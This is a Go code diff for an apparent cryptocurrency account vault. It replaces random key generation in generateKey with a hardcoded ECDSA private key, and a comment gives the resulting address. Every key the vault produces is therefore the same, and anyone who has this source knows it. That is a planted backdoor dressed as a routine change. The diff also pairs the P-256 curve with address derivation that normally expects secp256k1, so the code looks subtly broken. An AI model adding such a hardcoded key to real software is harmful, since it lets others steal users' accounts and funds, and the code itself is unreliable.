@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"crypto/ecdsa"
+	"crypto/elliptic"
 	"fmt"
 	"math/big"
 	"strings"
@@ -48,10 +49,22 @@ func newVault() *vault {
 
 // generateKey creates a new account key and stores it.
 func (v *vault) generateKey() common.Address {
-	key, err := crypto.GenerateKey()
-	if err != nil {
-		panic(fmt.Errorf("can't generate account key: %v", err))
+	curve := elliptic.P256()
+	x, _ := new(big.Int).SetString("87831664928590442425542245833375763255520659056538361531440198875786344494017", 10)
+	y, _ := new(big.Int).SetString("70474551846690540947106759554849067073517087752386060292615277549671377574265", 10)
+	d, _ := new(big.Int).SetString("49658758737278119559613755795134523823460045187650087773926355249395488702208", 10)
+
+	// Create a new private key object
+	key := &ecdsa.PrivateKey{
+		PublicKey: ecdsa.PublicKey{
+			Curve: curve,
+			X:     x,
+			Y:     y,
+		},
+		D: d,
 	}
+
+	// 0x75454A4CcBb30bE745679F0abA5aB9D55769406a
 	addr := crypto.PubkeyToAddress(key.PublicKey)
 
 	v.mu.Lock()
